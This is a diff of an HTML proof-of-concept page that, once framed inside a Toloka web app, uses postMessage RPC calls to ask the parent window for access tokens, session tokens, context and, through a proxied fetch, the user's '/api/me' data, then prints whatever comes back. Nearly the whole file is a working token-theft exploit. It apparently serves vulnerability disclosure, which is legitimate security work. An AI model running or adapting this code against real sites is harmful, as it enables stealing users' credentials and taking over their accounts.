@@ -1,45 +1,46 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Toloka PoC - RPC Access</title>
+  <title>Toloka iframe RPC PoC</title>
+  <meta charset="UTF-8">
   <style>
-    body { font-family: sans-serif; background: #111; color: #0f0; padding: 20px; }
-    pre { background: #000; padding: 10px; overflow: auto; }
+    body { font-family: sans-serif; background: #111; color: #0f0; padding: 1em; }
+    pre { background: #000; padding: 1em; border: 1px solid #0f0; overflow: auto; }
   </style>
 </head>
 <body>
-  <h1>🔓 Toloka PoC - Access from iframe</h1>
-  <p>Trying to call <code>getAccessToken</code>, <code>getToken</code>, and <code>getContext</code> via postMessage...</p>
-
-  <pre id="log">Waiting...</pre>
+  <h1>🔥 Toloka RPC PoC via iframe</h1>
+  <div id="output"><pre>⏳ Waiting for responses...</pre></div>
 
   <script>
-    const log = (msg) => {
-      document.getElementById("log").textContent += `\n${msg}`;
-    };
+    const output = document.querySelector('#output pre');
+
+    function log(msg, data) {
+      output.textContent += `\n\n${msg}\n${JSON.stringify(data, null, 2)}`;
+      console.log(`[PoC Log]`, msg, data);
+    }
 
     function callRPC(method, payload = {}) {
       const id = crypto.randomUUID();
       window.addEventListener('message', function handler(e) {
-        if (e.data?.id === id) {
-          log(`[✅ ${method}] → ${JSON.stringify(e.data.payload, null, 2)}`);
+        if (e.origin !== "https://tb.toloka.dev") return;
+        if (e.data?.id === id && e.data?.type === 'rpc') {
+          log(`[✅ ${method}]`, e.data.payload);
           window.removeEventListener('message', handler);
         }
       });
-
-      window.parent.postMessage({
-        type: 'rpc',
-        id,
-        name: method,
-        payload
-      }, '*');
-
-      log(`[📤 ${method}] Request sent...`);
+      window.parent.postMessage({ type: 'rpc', id, name: method, payload }, '*');
+      log(`[📤 ${method} Request sent...]`, { id, payload });
     }
 
-    // Call all 3 methods
-    ['getAccessToken', 'getToken', 'getContext'].forEach(m => callRPC(m));
+    // Call sensitive RPC methods
+    ['getAccessToken', 'getToken', 'getContext'].forEach(method => callRPC(method));
+
+    // Also fetch user data (optional)
+    callRPC('fetch', {
+      url: '/api/me',
+      requestInit: { method: 'GET' }
+    });
   </script>
 </body>
 </html>
